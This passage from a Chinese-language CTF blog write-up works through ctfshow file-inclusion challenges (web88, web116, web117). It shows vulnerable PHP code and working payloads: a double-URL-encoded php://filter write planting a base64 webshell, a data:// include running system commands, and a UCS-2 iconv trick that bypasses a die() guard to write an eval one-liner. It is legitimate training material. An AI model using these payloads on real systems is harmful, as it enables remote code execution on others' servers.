+<p>对文件名进行url解码后再用file_put_contents写入，通过把p换成%2570（%2570—&gt;%70—&gt;p）绕过对php的过滤</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">file=%2570hp%253A%2F%2Ffilter%2Fwrite%3Dconvert%252Ebase64-decode%2Fresource%3Dshell%252E%2570hp
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后post发包</p>
+<p><code>content=&lt;?php system($_GET[1]);?&gt;</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">content=aaPD9waHAgc3lzdGVtKCRfR0VUWzFdKTs/Pg==
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>访问shell.php</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230712181503264.png" title="image-20230712181503264" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230712181503264.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230712181503264.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230712181503264.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230712181503264.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230712181503264.png 2x"
+            sizes="auto"
+            alt="image-20230712181503264">
+    </a></figure></p>
+<p>rce得到flag</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230712181535641.png" title="image-20230712181535641" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230712181535641.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230712181535641.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230712181535641.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230712181535641.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230712181535641.png 2x"
+            sizes="auto"
+            alt="image-20230712181535641">
+    </a></figure></p>
+<h3 id="web88" class="headerLink">
+    <a href="#web88" class="header-mark"></a>2.8 [web88]</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cm">/*
+</span></span></span><span class="line"><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @Author: h1xa
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified by:   h1xa
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified time: 2020-09-17 02:27:25
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @link: https://ctfer.com
+</span></span></span><span class="line"><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/php|\~|\!|\@|\#|</span><span class="se">\\</span><span class="s2">$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&#34;</span><span class="p">,</span> <span class="nv">$file</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;error&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">include</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>对file的参数进行了过滤</p>
+<p>可以使用php data协议<code>?file=data://text/plain;base64,</code></p>
+<p>来传入<code>&lt;?php system('tac fl0g.php'); ?&gt;</code></p>
+<p>传参的时候需要对php代码进行base64编码</p>
+<p>编码后的字符串含有等于号，删掉就可以了</p>
+<p>payload:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://65b019f9-acd9-46fa-afae-e470af533a11.challenge.ctf.show/?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmwwZy5waHAnKTsgPz4                                               
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="web116" class="headerLink">
+    <a href="#web116" class="header-mark"></a>2.9 [web116]</h3><p>web文件上传+misc</p>
+<p>mp4视频下载下来之后，放入010发现末尾又疑似png文件尾</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230712184028670.png" title="image-20230712184028670" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230712184028670.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230712184028670.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230712184028670.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230712184028670.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230712184028670.png 2x"
+            sizes="auto"
+            alt="image-20230712184028670">
+    </a></figure></p>
+<p>顺势搜索png文件头89504E47</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230712184247220.png" title="image-20230712184247220" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230712184247220.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230712184247220.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230712184247220.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230712184247220.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230712184247220.png 2x"
+            sizes="auto"
+            alt="image-20230712184247220">
+    </a></figure></p>
+<p>将这块数据摘取出来，得到php代码
+<figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230712184357238.png" title="image-20230712184357238" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230712184357238.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230712184357238.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230712184357238.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230712184357238.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230712184357238.png 2x"
+            sizes="auto"
+            alt="image-20230712184357238">
+    </a></figure></p>
+<p>浏览器页面无回显，通过bp抓包发现可以读取文件</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230712184752855.png" title="image-20230712184752855" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230712184752855.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230712184752855.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230712184752855.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230712184752855.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230712184752855.png 2x"
+            sizes="auto"
+            alt="image-20230712184752855">
+    </a></figure></p>
+<h3 id="web117" class="headerLink">
+    <a href="#web117" class="header-mark"></a>2.10 [web117]</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cm">/*
+</span></span></span><span class="line"><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @Author: yu22x
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified by:   h1xa
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified time: 2020-10-01 18:16:59
+</span></span></span><span class="line"><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
+</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">filter</span><span class="p">(</span><span class="nv">$x</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#39;</span><span class="p">,</span><span class="nv">$x</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;too young too simple sometimes naive!&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$file</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$contents</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;contents&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nx">filter</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="s2">&#34;&lt;?php die();?&gt;&#34;</span><span class="o">.</span><span class="nv">$contents</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>考察点：绕过死亡die</p>
+<p>题目中过滤了很多协议和编码方式，但是除了我们常用的<a href="https://so.csdn.net/so/search?q=base64&amp;spm=1001.2101.3001.7020" target="_blank" rel="noopener noreferrer">base64</a>和rot13还是有很多方法可以绕过die的</p>
+<p><a href="https://www.php.net/manual/zh/mbstring.supported-encodings.php" target="_blank" rel="noopener noreferrer">支持的字符编码</a></p>
+<p><a href="https://blog.csdn.net/qq_44657899/article/details/109300335" target="_blank" rel="noopener noreferrer">php://filter的各种过滤器</a></p>
+<p>可以使用 <code>UCS-2LE UCS-2BE</code>，将字符两位两位进行交换，可以在本地进行测试</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725151719560.png" title="image-20230725151719560" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725151719560.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725151719560.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725151719560.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725151719560.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725151719560.png 2x"
+            sizes="auto"
+            alt="image-20230725151719560">
+    </a></figure></p>
+<p>payload:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?file=php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=5.php
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>post:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">post:contents=?&lt;hp pvela$(P_SO[T]1;)&gt;?
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725153523148.png" title="image-20230725153523148" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725153523148.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725153523148.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725153523148.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725153523148.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725153523148.png 2x"
+            sizes="auto"
+            alt="image-20230725153523148">
+    </a></figure></p>
+<p>然后读取flag</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725153547183.png" title="image-20230725153547183" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725153547183.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725153547183.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725153547183.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725153547183.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725153547183.png 2x"
+            sizes="auto"
+            alt="image-20230725153547183">
+    </a></figure></p>
+<p>（一开始把一句话木马写到flag.php里面把flag字符串覆盖掉了，到处早不到flag）QWQ&hellip;&hellip;&hellip;</p>
+</div>
+
+        
+
+
+<h2>Related Content</h2>
+<div class="related-container">
+    <div class="related-item-container">
+            <h2 class="related-title">
+                <a href="/buuctf_reinforce_wp/">BUUCTF awdp加固题</a>
+            </h2>
+        </div>
+    <div class="related-item-container">
+            <h2 class="related-title">
+                <a href="/ctfhub--info_leakage/">ctfhub_信息泄露wp</a>
+            </h2>
+        </div>
+    <div class="related-item-container">
+            <h2 class="related-title">
+                <a href="/ctfshow_deserialize/">ctfshow_deserialize</a>
+            </h2>
+        </div>
+    <div class="related-item-container">
+            <h2 class="related-title">
+                <a href="/ctfshow_file_upload/">ctfshow_file_upload</a>
+            </h2>
+        </div>
+    <div class="related-item-container">
+            <h2 class="related-title">
+                <a href="/ctfshow_rce/">ctfshow_rce</a>
+            </h2>
+        </div>
+    
+
+</div>
+
+<div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 0001-01-01</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span><a class="link-to-mardown" href=/ctfshow_file_include/index.md target="_blank" rel="noopener noreferrer">Read markdown</a>
+                    </span><span>|&nbsp;<a class="link-to-source" href=https://github.com/HEIGE-PCloud/DoIt/blob/main/exampleSite/content/posts\ctfshow_file_include.md target="_blank" rel="noopener noreferrer">View source</a>
+                    </span><span>|&nbsp;<a class="link-to-edit" href=https://github.com/HEIGE-PCloud/DoIt/edit/main/exampleSite/content/posts\ctfshow_file_include.md target="_blank" rel="noopener noreferrer">Edit this page</a>
+                    </span><span>|&nbsp;<a class="link-to-report" href=https://github.com/HEIGE-PCloud/DoIt/issues/new?title=[bug]%20ctfshow_file_include&body=|Field|Value|%0A|-|-|%0A|Title|ctfshow_file_include|%0A|Url|http://scofield1920.github.io/ctfshow_file_include/|%0A|Filename|https://github.com/HEIGE-PCloud/DoIt/blob/main/exampleSite/content/posts\ctfshow_file_include.md| target="_blank" rel="noopener noreferrer">Report issue</a>
+                    </span></div>
+            <div class="post-info-share"><button title="Share on Twitter" data-sharer="twitter" data-url="http://scofield1920.github.io/ctfshow_file_include/" data-title="ctfshow_file_include" data-hashtags="CTF,web"><span class="fab fa-twitter fa-fw"></span></button><button title="Share on Facebook" data-sharer="facebook" data-url="http://scofield1920.github.io/ctfshow_file_include/" data-hashtag="CTF"><span class="fab fa-facebook-square fa-fw"></span></button><button title="Share on Hacker News" data-sharer="hackernews" data-url="http://scofield1920.github.io/ctfshow_file_include/" data-title="ctfshow_file_include"><span class="fab fa-hacker-news fa-fw"></span></button><button title="Share on Line" data-sharer="line" data-url="http://scofield1920.github.io/ctfshow_file_include/" data-title="ctfshow_file_include"><span data-svg-src="/lib/simple-icons/icons/line.min.svg"></span></button><button title="Share on 微博" data-sharer="weibo" data-url="http://scofield1920.github.io/ctfshow_file_include/" data-title="ctfshow_file_include"><span class="fab fa-weibo fa-fw"></span></button><button title="Share on Telegram" data-sharer="telegram" data-url="http://scofield1920.github.io/ctfshow_file_include/" data-title="ctfshow_file_include" data-web><span class="fab fa-telegram-plane fa-fw"></span></button><script>
+        function shareOnMastodon(title, link) {
+            const SHARE_MASTODON_DOMAIN = "share_mastodon_domain"
+            const savedDomain = localStorage.getItem(SHARE_MASTODON_DOMAIN) ?? "mastodon.social";
+            const domain = prompt("Enter your Mastodon domain", savedDomain);
+            if (domain === null) {
+                return;
+            }
+            localStorage.setItem(SHARE_MASTODON_DOMAIN, domain)
+            const text = title + "\n\n" + link;
+            const url = new URL("https://" + domain)
+            url.pathname = "share"
+            url.searchParams.append('text', text)
+            window.open(url, '_blank', "width=500,height=500,left=500,toolbar=0,status=0");
+        }
+    </script>
+    <button title="Share on Mastodon"onclick="javascript:shareOnMastodon(&#34;ctfshow_file_include&#34;, &#34;http://scofield1920.github.io/ctfshow_file_include/&#34;)"><span class="fab fa-mastodon fa-fw"></span></button></div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/ctf/">CTF</a>,&nbsp;<a href="/tags/web/">web</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/ctfshow_file_upload/" class="prev" rel="prev" title="ctfshow_file_upload"><i class="fas fa-angle-left fa-fw"></i>ctfshow_file_upload</a>
+            <a href="/ctfshow_deserialize/" class="next" rel="next" title="ctfshow_deserialize">ctfshow_deserialize<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div id="utterances"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">Utterances</a>.
+            </noscript></div></article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">
+                    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreferrer" title="Hugo 0.120.4">Hugo</a>&nbsp;|&nbsp;Theme - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreferrer" title="DoIt 0.4.0"><i class="far fa-edit fa-fw"></i> DoIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank" rel="noopener noreferrer"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="Back to Top">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":10},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"","lightTheme":"github-light","repo":"Hugo-DoIt/utterances-comments"}},"data":{"desktop-header-typeit":"Scfie1d-Blog","mobile-header-typeit":"Scfie1d-Blog"},"search":{"algoliaAppID":"5YGRNRQK1G","algoliaIndex":"en_index","algoliaSearchKey":"0ff6874805de24b84aa1d5ebccad56cd","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":300,"type":"algolia"},"sharerjs":true,"table":{"sort":true},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"desktop-header-typeit":["desktop-header-typeit"],"mobile-header-typeit":["mobile-header-typeit"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/typeit.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script><script type="text/javascript" src="/js/utterances.min.js" defer></script></div>
+</body>
+
+</html>
